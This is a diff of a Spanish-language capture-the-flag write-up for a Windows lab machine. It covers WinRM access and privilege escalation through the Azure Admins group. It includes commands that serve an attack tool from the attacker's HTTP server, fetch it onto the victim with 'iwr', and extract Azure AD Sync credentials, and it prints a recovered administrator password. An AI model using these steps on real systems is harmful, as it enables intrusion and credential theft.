@@ -175,10 +175,7 @@ Después de estar viendo diferentes maneras de explotar el tener un usuario que 
 
 ![Pasted image 20250315143312](https://github.com/user-attachments/assets/d1fad06a-2301-4cab-bf00-956fcc725806)
 
-Sorprendentemente, ahora el p5985 aparece abierto. Aunque en el escaneo inicial no aparecía, se intentó probar credenciales contra winrm, resultando dichas validaciones fallidas. Cuando pasan este tipo de situaciones en las que no somos capaces de tener acceso a la máquina, puede ser realmente útil reiniciar la máquina para:
-
-- Respirar
-- Ver si hay algún servicio que no se ha levantado correctamente.
+Sorprendentemente, ahora el p5985 aparece abierto. Aunque en el escaneo inicial no aparecía, se intentó probar credenciales contra winrm, resultando dichas validaciones fallidas. Cuando pasan este tipo de situaciones en las que no somos capaces de tener acceso a la máquina, puede ser realmente útil reiniciar la máquina. Nos da tiempo para respirar y comprobar si algún servicio no se había levantado correctamente.
 
 Vamos a probar las credenciales que tenemos contra winrm.
 
@@ -199,6 +196,7 @@ En C:\Users\mhope\Desktop encontramos la flag de usuario.
 
 ![Pasted image 20250315143940](https://github.com/user-attachments/assets/65a1ea7d-cd28-48c0-928d-6ee869147847)
 
+
 # Privesc
 
 Confirmamos que mhope forma parte del grupo Azure Admins:
@@ -216,11 +214,11 @@ Una vez lo tenemos en la máquina atacante se lo compartimos a la máquina víct
 
 - Creamos en máquina víctima carpeta temp en C:\ -> ``mkdir C:\temp`` y nos movemos a ella.
 
-- Abrimos http server en máquina atacante para compartir ambos archivos.
+- Abrimos http server en máquina atacante para compartir ambos archivos:
 
 ``python3 -m http.server 80``
 
-- Hacemos solicitud de los recursos desde máquina víctima
+- Hacemos solicitud de los recursos desde máquina víctima:
 
 ``iwr http://10.10.14.8/AdDecrypt.exe -o AdDecrypt.exe``
 
@@ -228,7 +226,7 @@ Una vez lo tenemos en la máquina atacante se lo compartimos a la máquina víct
 
 ![Pasted image 20250315145930](https://github.com/user-attachments/assets/cdc6df66-75fc-436f-84cb-12d23c8a5142)
 
-Una vez los tenemos en máquina víctima, seguimos las instrucciones del github.
+Una vez los tenemos en máquina víctima, seguimos las instrucciones del github:
 
 - Nos dirigimos al directorio: C:\Program Files\Microsoft Azure AD Sync\Bin y ejecutamos:
   
@@ -236,7 +234,7 @@ Una vez los tenemos en máquina víctima, seguimos las instrucciones del github.
 
 ![Pasted image 20250315150238](https://github.com/user-attachments/assets/9a935a21-fe58-41ea-abbd-325b8cca655a)
 
-Ojito con lo que tenemos.
+Ojito con lo que tenemos:
 
 - administrator : d0m@in4dminyeah!
 
